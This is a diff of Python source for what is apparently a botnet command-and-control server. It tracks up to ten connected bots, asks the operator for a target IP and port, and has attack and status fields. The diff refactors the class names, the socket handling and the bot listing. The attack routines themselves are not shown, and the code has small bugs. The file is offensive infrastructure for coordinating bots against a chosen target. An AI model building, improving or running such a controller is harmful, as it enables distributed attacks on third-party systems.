@@ -5,15 +5,16 @@ import time
 from io import StringIO
 from typing import List
 
-class netbot:
-    def __init__(self, id, is_start, ip_address):
+class Netbot:
+    def __init__(self, id, is_start, address):
         self.id = id
         self.is_start = is_start
-        self.ip_address = ip_address
+        self.address = address
 
 class Server:
-    def __init__(self):
-        self.socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def __init__(self, socketfd):
+        # self.socketfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socketfd = socketfd
 
         self.attacking = False
         self.attack = "None"
@@ -24,18 +25,6 @@ class Server:
         self.netbots = []
         self.threads = []
         self.tListener = threading.Thread()
-
-    def get_server_fd(self):
-        return self.socketfd
-    
-    def set_server_fd(self, socketfd):
-        self.socketfd = socketfd
-
-    def set_attack(self, attack):
-        self.attack = attack
-    
-    def is_attacking(self):
-        return self.attacking
 
     def server_status(self):
         if self.target_ip == "None" and self.attack == "None" and self.attacking == False:
@@ -54,10 +43,8 @@ class Server:
             return "\nServer started, waiting for client connections...\n"
             
     def setup_target_parameters(self):
-        print("Enter target IP address: ")
-        input(self.target_ip)
-        print("\nEnter target port: ")
-        input(self.target_port)
+        self.target_ip = input("Enter target IP address: ")
+        self.target_port = input("Enter target port: ")
         
     def start_attack(self):
         if(self.attack != "None" and self.target_ip != "None" and self.target_port != 0):
@@ -77,8 +64,9 @@ class Server:
         os.system("clear")
         print(f"\n\nBots connected ({len(self.netbots)}):\n")
 
+        i = 0
         for bot in self.netbots:
-            print(f"bot: {bot.ip_address}")
+            print(f"bot {i}: {bot.address[0]} : {bot.address[1]}")
         
         print("\nPress any key to exit...")
 
@@ -144,7 +132,7 @@ class Server:
                             self.netbots.remove(netbot)
                             netbot -= 1
 
-                    print(f"\nNetbot ({bot.ip_address}) disconnected.", flush=True)
+                    print(f"\nNetbot ({bot.address[0]} : {bot.address[1]}) disconnected.", flush=True)
 
                     i.close()
 
@@ -158,12 +146,11 @@ class Server:
     
     def connection_listener(self, i):
         while len(self.netbots) != 10:
-            client_socket, client_address = i.accept()
-            client_ip = client_address[0]
-            print(f"Client connected: {client_ip}\tTotal Bots Connected: {len(self.netbots)}")
+            client_socket, client_address = self.socketfd.accept()
+            print(f"Client connected: {client_address[0]} : {client_address[1]}\tTotal Bots Connected: {len(self.netbots)}")
 
             # 将客户端信息添加到netbots列表
-            netbot = netbot(id = client_socket.fileno(), start = time.time(), ip_address = client_ip)
+            netbot = Netbot(id = client_socket, is_start = False, address = client_address)
             self.netbots.append(netbot)
 
             # 创建并启动
